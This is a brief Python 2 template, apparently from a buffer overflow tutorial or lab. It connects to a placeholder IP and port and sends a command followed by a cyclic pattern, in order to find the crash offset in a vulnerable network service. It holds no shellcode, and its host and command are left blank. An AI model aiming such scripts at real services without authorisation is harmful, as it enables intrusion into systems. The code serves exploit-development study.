import sys,socket
offset = "<paster pattern>"
try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('<ip>',<port>))
	s.send(('<command> /.:/' + offset))
	s.close()
except:
	print "[+] ERROR"
	sys.exit()
